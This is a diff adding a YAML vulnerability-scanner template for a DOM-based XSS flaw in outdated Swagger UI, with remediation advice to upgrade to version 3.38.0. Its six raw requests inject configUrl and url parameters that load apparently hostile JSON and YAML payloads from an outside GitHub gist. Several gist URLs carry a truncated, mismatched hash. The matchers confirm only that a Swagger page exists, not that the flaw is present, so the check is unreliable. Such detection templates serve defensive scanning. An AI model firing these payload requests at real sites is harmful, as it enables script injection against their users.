@@ -1,0 +1,54 @@
+id: Swagger-UI-XSS
+
+info:
+  name: Swagger UI XSS Vulnerability
+  author: li1u(https://huclilu.github.io/)
+  severity: medium
+  description: |
+    Swagger UI used an outdated DomPurify library, which, due to its characteristics, allowed DOM-based XSS controlled by query parameters. This vulnerability allows attackers to inject HTML elements with any attributes on the page. The issue is fixed in version 3.38.0, and affected users are advised to update Swagger UI to the latest version. The vulnerability can be exploited via index.html?configUrl=xxx.json or index.html?url=xxx.yaml.
+  remediation: |
+    Upgrade Swagger UI to version 3.38.0 or later to mitigate this vulnerability.
+  tags: Swagger-UI
+
+http:
+  - raw:
+      - |
+        GET /swagger-ui.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /swagger-ui.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb45704b8fb5ed505fee1637/li1u.yaml HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /swagger/index.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb5ed505fee1637/li1u.yaml HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /swagger/index.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /swagger-ui/index.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb5ed505fee1637/li1u.yaml HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        GET /swagger-ui/index.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "swagger-ui/css"
+          - "swagger-ui.css"
+          - "swagger-ui-"
+        condition: or
+      - type: status
+        status:
+          - 200
